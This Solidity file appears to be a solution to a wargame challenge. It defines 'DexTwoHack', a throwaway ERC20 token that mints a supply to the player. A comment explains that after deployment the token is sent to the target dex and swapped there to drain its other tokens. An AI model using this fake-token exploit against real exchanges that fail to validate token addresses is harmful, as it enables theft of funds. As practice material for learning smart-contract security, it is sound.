// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts/contracts/token/ERC20/ERC20.sol';

// Deploy this, transfer the dex 1, then use it to swap for the other tokens
contract DexTwoHack is ERC20 {
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
    ERC20('HackCoin', '0xBADNEWS') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));

    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
}